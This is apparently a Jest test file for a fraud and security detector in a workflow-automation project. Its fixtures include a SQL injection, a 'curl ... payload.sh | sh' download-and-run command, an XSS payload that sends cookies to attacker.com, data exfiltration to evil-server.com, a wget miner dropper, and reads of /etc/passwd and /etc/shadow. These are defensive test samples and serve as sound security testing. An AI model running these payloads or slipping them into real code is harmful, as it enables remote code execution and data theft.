/**
 * Fraud Detection Tests for PocketFlow Theme
 */

import { MockDetector } from '../../../../shared/fraud-detection/detectors/mock-detector';
import { SecurityDetector } from '../../../../shared/fraud-detection/detectors/security-detector';
import { AnomalyDetector } from '../../../../shared/fraud-detection/detectors/anomaly-detector';
import { InputValidator } from '../../../../shared/fraud-detection/detectors/input-validator';
import { FraudScorer } from '../../../../shared/fraud-detection/scoring/fraud-scorer';
import { FraudReporter } from '../../../../shared/fraud-detection/reporting/fraud-reporter';
import { FraudCheckType, FraudSeverity, ExportFormat } from '../../../../shared/fraud-detection/types';
import { FlowEngine } from '../../src/flow-engine';
import { FlowValidator } from '../../src/flow-validator';
import { AutomationBuilder } from '../../src/automation-builder';

describe('PocketFlow Fraud Detection', () => {
  let fraudScorer: FraudScorer;
  let fraudReporter: FraudReporter;
  let flowEngine: FlowEngine;
  let flowValidator: FlowValidator;
  let automationBuilder: AutomationBuilder;

  beforeEach(() => {
    // Setup fraud detection
    fraudScorer = new FraudScorer({
      enabledDetectors: [
        FraudCheckType.MOCK_DETECTION,
        FraudCheckType.SECURITY_VALIDATION,
        FraudCheckType.ANOMALY_DETECTION,
        FraudCheckType.INPUT_VALIDATION
      ],
      scoreThreshold: 60,
      strictMode: true,
      logging: true
    });

    // Register detectors
    fraudScorer.registerDetector(new MockDetector());
    fraudScorer.registerDetector(new SecurityDetector());
    fraudScorer.registerDetector(new AnomalyDetector());
    fraudScorer.registerDetector(new InputValidator());

    fraudReporter = new FraudReporter();

    // Setup PocketFlow components
    flowEngine = new FlowEngine();
    flowValidator = new FlowValidator();
    automationBuilder = new AutomationBuilder();
  });

  describe('Flow Definition Security', () => {
    it('should detect malicious flow definitions', async () => {
      const maliciousFlow = {
        name: 'Data Exfiltration Flow',
        description: 'Backup user data to external server',
        nodes: [
          {
            id: 'read_db',
            type: "database",
            config: {
              query: "SELECT * FROM users; DROP TABLE audit_logs; --",
              connection: 'main_db'
            }
          },
          {
            id: 'send_data',
            type: 'http',
            config: {
              url: 'http://evil-server.com/steal-data',
              method: 'POST',
              headers: {
                'X-Stolen-From': '${HOSTNAME}'
              }
            }
          }
        ],
        edges: [
          { from: 'read_db', to: 'send_data' }
        ]
      };

      const fraudResult = await fraudScorer.score(maliciousFlow);

      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.riskLevel).toBe("critical");
      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('sql_injection'),
          severity: FraudSeverity.CRITICAL
        })
      );
      expect(fraudResult.recommendations).toContain('Block this request/user');
    });

    it('should detect command injection in flow actions', async () => {
      const flowWithCommands = {
        name: 'System Maintenance',
        nodes: [
          {
            id: 'execute',
            type: 'shell',
            config: {
              command: 'rm -rf /tmp/* && curl http://malware.com/payload.sh | sh'
            }
          }
        ]
      };

      const fraudResult = await fraudScorer.score(flowWithCommands);

      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('command_injection'),
          severity: FraudSeverity.CRITICAL
        })
      );
    });

    it('should validate flow node configurations', async () => {
      const invalidFlow = {
        name: '',  // Empty name
        nodes: [
          {
            id: 'a'.repeat(1000), // Extremely long ID
            type: 'unknown_type',
            config: {
              timeout: -1,
              retries: 999999
            }
          }
        ]
      };

      const fraudResult = await fraudScorer.score(invalidFlow);

      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.aggregatedViolations.length).toBeGreaterThan(0);
      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('invalid_format')
        })
      );
    });
  });

  describe('Automation Script Analysis', () => {
    it('should detect mock usage in automation scripts', async () => {
      const automationScript = `
        // Automation script for testing
        const api = jest.mock('../api');
        const mockResponse = { status: 200, data: [] };
        
        function runAutomation() {
          api.mockReturnValue(mockResponse);
          return processData(api.getData());
        }
      `;

      const fraudResult = await fraudScorer.score({ script: automationScript });

      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('mock_usage'),
          message: expect.stringContaining('jest.mock')
        })
      );
    });

    it('should detect XSS attempts in flow templates', async () => {
      const flowTemplate = {
        name: 'User Notification',
        template: `
          <div>
            <h1>{{userInput}}</h1>
            <script>alert('XSS')</script>
            <img src=x onerror="fetch('http://attacker.com?cookie='+document.cookie)">
          </div>
        `,
        variables: {
          userInput: '<script>malicious()</script>'
        }
      };

      const fraudResult = await fraudScorer.score(flowTemplate);

      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('xss_attempt'),
          severity: FraudSeverity.HIGH
        })
      );
    });
  });

  describe('Flow Execution Anomalies', () => {
    it('should detect anomalous flow execution patterns', async () => {
      const executionHistory = {
        flowId: 'daily-backup',
        executions: [
          { timestamp: '2024-01-01T02:00:00Z', duration: 300, status: 'success' },
          { timestamp: '2024-01-02T02:00:00Z', duration: 298, status: 'success' },
          { timestamp: '2024-01-03T02:00:00Z', duration: 302, status: 'success' },
          { timestamp: '2024-01-04T02:00:00Z', duration: 15000, status: 'success' }, // Anomaly
          { timestamp: '2024-01-05T02:00:00Z', duration: 301, status: 'success' }
        ]
      };

      const fraudResult = await fraudScorer.score(executionHistory);

      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('statistical_anomaly'),
          message: expect.stringContaining('outlier')
        })
      );
    });

    it('should detect suspicious automation triggers', async () => {
      const flowTriggers = {
        flowId: 'sensitive-operation',
        triggers: [
          {
            type: 'webhook',
            source: 'http://suspicious-domain.tk/trigger',
            frequency: 1000, // Triggered 1000 times in short period
            lastHour: true
          },
          {
            type: "schedule",
            expression: '* * * * * *', // Every second
            enabled: true
          }
        ]
      };

      const fraudResult = await fraudScorer.score(flowTriggers);

      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('unusual_behavior')
        })
      );
    });
  });

  describe('Input Validation for Flows', () => {
    it('should validate flow input parameters', async () => {
      const flowInput = {
        flowId: '../../../etc/passwd', // Path traversal attempt
        parameters: {
          email: 'not-an-email',
          creditCard: "4111111111111111", // Test credit card
          api_key: process.env.API_KEY || "PLACEHOLDER", // Looks like a real API key
        }
      };

      const fraudResult = await fraudScorer.score(flowInput);

      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('path_traversal')
        })
      );
      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('unauthorized_access'),
          message: expect.stringContaining('Sensitive data')
        })
      );
    });

    it('should detect prototype pollution attempts', async () => {
      const maliciousPayload = {
        flowConfig: {
          "__proto__": {
            "isAdmin": true
          },
          "constructor": {
            "prototype": {
              "isAdmin": true
            }
          }
        }
      };

      const fraudResult = await fraudScorer.score(maliciousPayload);

      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          type: expect.stringContaining('suspicious_pattern'),
          message: expect.stringContaining('prototype pollution')
        })
      );
    });
  });

  describe('Flow Marketplace Security', () => {
    it('should scan marketplace flows for malicious code', async () => {
      const marketplaceFlow = {
        id: 'community-flow-123',
        author: 'unknown',
        downloads: 10000,
        code: `
          // Community contributed flow
          const exec = require('child_process').exec;
          
          module.exports = function(input) {
            // Hidden malicious code
            if (input.trigger === 'special') {
              exec('wget http://malware.com/miner.sh -O /tmp/m && sh /tmp/m');
            }
            
            // Normal looking code
            return processData(input);
          }
        `
      };

      const fraudResult = await fraudScorer.score(marketplaceFlow);

      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.overallScore).toBeGreaterThan(80);
      expect(fraudResult.recommendations).toContain('Review deployment pipeline for mock removal');
    });
  });

  describe('Real-time Flow Monitoring', () => {
    it('should monitor flow executions for fraud patterns', async () => {
      const monitoringData = {
        activeFlows: [
          {
            id: 'flow-1',
            name: 'Data Export',
            currentNode: 'database_query',
            query: "SELECT * FROM users WHERE admin = true",
            destination: 'external_api'
          },
          {
            id: 'flow-2',
            name: 'File Processor',
            currentNode: 'file_read',
            path: '/etc/shadow', // Attempting to read sensitive file
            action: 'upload_to_cloud'
          }
        ]
      };

      const fraudResult = await fraudScorer.score(monitoringData);
      const report = fraudReporter.generateReport(fraudResult);

      expect(fraudResult.passed).toBe(false);
      expect(report.summary.criticalViolations).toBeGreaterThan(0);

      // Generate alert
      const htmlReport = fraudReporter.exportReport(report, ExportFormat.HTML);
      expect(htmlReport).toContain('class="risk-critical"');
      expect(htmlReport).toContain("CRITICAL");
    });
  });

  describe('Flow Version Control Security', () => {
    it('should detect malicious changes in flow versions', async () => {
      const flowDiff = {
        flowId: 'payment-processor',
        previousVersion: {
          nodes: [
            {
              id: 'validate_payment',
              type: "validator",
              config: {
                validateCard: true,
                validateCVV: true
              }
            }
          ]
        },
        newVersion: {
          nodes: [
            {
              id: 'validate_payment',
              type: "validator",
              config: {
                validateCard: false, // Security validation disabled
                validateCVV: false,
                skipFraudCheck: true, // New suspicious flag
                logCardDetails: true  // Logging sensitive data
              }
            }
          ]
        },
        author: 'new-contributor',
        message: 'Performance optimization'
      };

      const fraudResult = await fraudScorer.score(flowDiff);

      expect(fraudResult.passed).toBe(false);
      expect(fraudResult.aggregatedViolations).toContainEqual(
        expect.objectContaining({
          message: expect.stringContaining('Security validation disabled')
        })
      );
    });
  });

  describe('Integration with PocketFlow Engine', () => {
    it('should integrate fraud detection with flow validation', async () => {
      const flow = {
        name: 'User Data Processing',
        nodes: [
          {
            id: 'fetch_users',
            type: "database",
            config: {
              query: 'SELECT * FROM users',
              mock: true // Using mock in production flow
            }
          }
        ]
      };

      // First validate with PocketFlow
      const validationResult = await flowValidator.validate(flow);
      
      // Then check for fraud
      const fraudResult = await fraudScorer.score(flow);

      expect(validationResult.isValid).toBe(true); // Structurally valid
      expect(fraudResult.passed).toBe(false); // But contains mocks
      
      // Combined decision
      const shouldDeploy = validationResult.isValid && fraudResult.passed;
      expect(shouldDeploy).toBe(false);
    });
  });
});